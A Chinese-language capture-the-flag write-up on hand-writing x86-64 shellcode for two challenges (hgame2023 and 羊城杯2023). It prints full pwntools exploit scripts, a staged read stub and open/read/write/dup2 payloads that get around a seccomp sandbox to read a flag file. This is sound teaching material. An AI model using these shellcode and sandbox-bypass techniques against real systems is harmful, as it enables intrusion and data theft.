# how2手写shellcode

羊城杯shellcode怎么写都绕不过，痛定思痛决定好好学一下怎么手写shellcode

本文通过例题介绍一下如何手写shellcode来实现我们想要的功能，对于使用工具主动生成shellcode就不再赘述

## hgame2023-simple_shellcode

保护全开，沙箱禁system

![](./img/3112275378817898463.png)

![](./img/716175575888996678.png)

![](./img/8310750363924263640.png)

存在可写可执行段，可以构造shellcode送入此处，但read只能读入0x10大小

![](./img/3336996835126222440.png)

由于程序只执行一次，且可利用空间较小无法构造orw，所以构造read(0,0xcafe0000,0x1000)

下面再读入构造的orw

![](./img/1383406346171677351.png)

    
    
    sc = asm('''
    xor eax, eax 
    xor edi, edi 
    mov edx, 0x1000
    mov esi, 0xcafe0000
    syscall
    ''')
    #syscall(0,0,0xcafe0000,0x1000)
    

![](./img/1414507512583502988.png)

###### exp:

    
    
    #encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    #from ae64 import AE64
    #from LibcSearcher import * 
    
    context.os = 'linux'
    context.arch = 'amd64'
    #context.arch = 'i386'
    context.log_level = "debug"
    
    name = './vuln'
    
    debug = 0
    if debug:
        p = remote('127.0.0.1',9999)
    else:
        p = process(name)
    
    #libcso = '/lib/x86_64-linux-gnu/libc.so.6'
    libcso = './libc-2.31.so'
    libc = ELF(libcso)
    #libc = elf.libc
    elf = ELF(name)
    
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    
    sc = asm('''
    xor eax, eax
    xor edi, edi
    mov edx, 0x1000
    mov esi, 0xcafe0000
    syscall
    ''')
    ru(b"shellcode:")
    dbg()
    s(sc)
    
    shellcode = b"\x90" * 0x100
    shellcode += asm(shellcraft.open("/flag"))
    shellcode += asm(shellcraft.read(3, 0xCAFE0500, 0x500))
    shellcode += asm(shellcraft.write(1, 0xCAFE0500, 0x500))
    
    p.send(shellcode)
    
    itr()
    

‍

## 羊城杯2023-shellcode

##### 静态分析：

![](./img/1061834192809240954.png)

主函数：

![](./img/9100046263754858820.png)

进入分支

![](./img/6359269444799844109.png)

程序对读入的内容进行限制，要求输入字符十六进制ascii码在`0x79-0x95`​之间，即`OPQRSTUVWXYZ[]^_`​

![](./img/7377840881230624368.png)

同时检查 `v4`​ 相对于 `s`​ 数组的偏移是否等于16字节，不过可以多写一位，即输入内容限制在17字节大小

![](./img/8154792828204185593.png)

我们可以看到启动沙箱后会去执行我们写入的内容

![](./img/4544678764003745395.png)

    
    
    0000: 0x20 0x00 0x00 0x00000004  A = arch
    0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
    0002: 0x20 0x00 0x00 0x00000000  A = sys_number
    0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
    0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
    0005: 0x15 0x0d 0x00 0x00000002  if (A == open) goto 0019
    0006: 0x15 0x0c 0x00 0x00000021  if (A == dup2) goto 0019
    0007: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0013
    0008: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
    0009: 0x25 0x0a 0x00 0x00000000  if (A > 0x0) goto 0020
    0010: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0019
    0011: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
    0012: 0x25 0x07 0x06 0x00000002  if (A > 0x2) goto 0020 else goto 0019
    0013: 0x15 0x00 0x06 0x00000001  if (A != write) goto 0020
    0014: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
    0015: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0019
    0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
    0017: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
    0018: 0x25 0x00 0x01 0x00000002  if (A <= 0x2) goto 0020
    0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
    0020: 0x06 0x00 0x00 0x00000000  return KILL
    

stack段可写可执行，但对shellcode的限制相当大

![](./img/7342658958372173399.png)

首先要绕过if判断，17字节大小内的shellcode显然不够，我们还需要进一步续写shellcode并能绕过沙箱去读到flag

‍

##### 动态调试：

    
    
    ru(b'[2] Input: (ye / no)\n')
    s(asm('syscall'))
    

![](./img/4648772374563143494.png)

绕过if判断进入分支同时写入syscall

![](./img/4347897997913741099.png)

![](./img/4046402857645195138.png)

编写shellcode设置寄存器，构造一次read，利用传入的syscall(x05x0f)作为read的rdx参数

最终构造好syscall(0,0,syscall_addr,0x50f)全部参数后跳转到syscall地址处进行系统调用来续写，并继续执行

    
    
    push rbx #rsp 0；start_addr-0x8 （start0x2478）
    pop rax #1 rax 0；start_addr
    pop rsi #+8
    pop rsi #+8
    
    pop rsi #2 三次pop赋rsi start+0x68 <- 0x50f；start_addr+0x18
    push rax #rsp 0；start_addr+0x10
    pop rdi #3 rdi 0
    pop rdx #+8
    
    push rsi #rsp start+0x68 <- 0x50f；start_addr+0x18
    pop rsp #rsp start+0x68 <- 0x50f；start+0x68
    pop rdx #4 rdx 0x50f
    push rdx #start+0x68
    
    push rsi #start+0x68-0x8
    push rax #-8
    pop rax #+8
    push rsi #rsp start+0x68<-0x50f；start+0x68-0x10
    
    ret #start+0x68 syscall
    
    #syscall(0,0,start+0x68,0x50f)
    

###### 绕过沙箱orw+dup2:

    
    
    sc1 = asm('''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 0x2
    pop rax
    syscall
    mov rax,0x21
    mov rdi,0x3
    mov rsi,0x2
    syscall
    xor rax,rax
    mov rsi,rsp
    push 0x2
    pop rdi
    mov rdx,0x30
    syscall
    mov rax,0x21
    mov rdi,0x1
    mov rsi,0x5
    syscall
    mov rax,0x1
    mov rsi,rsp
    mov rdi,0x5
    syscall
    ''') 
    s(b'aa'+sc1)
    

补两字节对齐

![](./img/7096918299974850284.png)

open('flag')

![](./img/5339296481400770791.png)

dup2(3,2)

![](./img/6244505832281801474.png)

read(2,'flag',0x30)

![](./img/1511645230118621385.png)

dup2(1,5)

![](./img/8231169805483981627.png)

write(5,start+0x58,0x30)

###### exp：

    
    
    # encoding = utf-8
    from pwn import *
    from pwnlib.rop import *
    from pwnlib.context import *
    from pwnlib.fmtstr import *
    from pwnlib.util.packing import *
    from pwnlib.gdb import *
    from ctypes import *
    import os
    import sys
    import time
    import base64
    
    # from ae64 import AE64
    # from LibcSearcher import *
    
    context.os = 'linux'
    context.arch = 'amd64'
    # context.arch = 'i386'
    context.log_level = "debug"
    
    name = './pwn'
    
    debug = 0
    if debug:
        p = remote('127.0.0.1',8000)
    else:
        p = process(name)
    
    libcso = '/lib/x86_64-linux-gnu/libc.so.6'
    #libcso = './libc-2.31.so'
    libc = ELF(libcso)
    #libc = elf.libc
    elf = ELF(name)
    
    s       = lambda data               :p.send(data)
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
    sl      = lambda data               :p.sendline(data)
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    
    context.terminal = ['gnome-terminal','-x','sh','-c']
    
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    
    
    ru(b'[2] Input: (ye / no)\n')
    s(asm('syscall'))
    
    ru(b'======\n')
    
    sc0=asm('''
    push rbx
    pop rax
    pop rsi
    pop rsi
    pop rsi
    push rax
    pop rdi
    pop rdx
    push rsi
    pop rsp
    pop rdx
    push rdx
    push rsi
    push rax
    pop rax
    push rsi
    ret
    ''')
    #dbg()
    s(sc0)
    
    sc1 = asm('''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 0x2
    pop rax
    syscall
    mov rax,0x21
    mov rdi,0x3
    mov rsi,0x2
    syscall
    xor rax,rax
    mov rsi,rsp
    push 0x2
    pop rdi
    mov rdx,0x30
    syscall
    mov rax,0x21
    mov rdi,0x1
    mov rsi,0x5
    syscall
    mov rax,0x1
    mov rsi,rsp
    mov rdi,0x5
    syscall
    ''') 
    pause()
    s(b'aa'+sc1)
    
    
    itr()
    

![](./img/7941248106796591857.png)

‍

## 参考：

感谢师傅们的文章和wp：

[2023年“羊城杯”网络安全大赛Writeup
(qq.com)](https://mp.weixin.qq.com/s/pzwDVavbXb13U1ECTppNBQ?ref=www.ctfiot.com)

[羊城杯 2023 Writeup - 星盟安全团队
(xmcve.com)](http://blog.xmcve.com/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-Writeup/#)

[手把手教你写纯字符ascii shellcode——最通俗易懂的alphanumeric shellcode生成指南_TaQini852的博客-CSDN博客](https://blog.csdn.net/SmalOSnail/article/details/105236336#:~:text=AE64%E7%9A%84%E4%BC%98%E5%8A%BF%E5%9C%A8%E4%BA%8E%E7%BC%96%E7%A0%81%E6%97%B6%E5%8F%AF%E4%BB%A5%E6%9B%B4%E5%8A%A0%E7%81%B5%E6%B4%BB%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E7%94%9F%E6%88%90%E7%9A%84alpha,shellcode%E6%AF%94alpha3%E8%A6%81%E6%9B%B4%E9%95%BF%E4%B8%80%E4%BA%9B%E3%80%82%20%E6%AD%A4%E5%A4%96AE64%E6%98%AFpython%E5%86%99%E7%9A%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%9C%A8python%E4%B8%AD%E8%B0%83%E7%94%A8%EF%BC%8C%E4%BB%A5%E4%B8%8B%E6%98%AF%E5%AE%98%E6%96%B9%E7%9A%84%E6%A0%97%E5%AD%90%EF%BC%9A)

‍

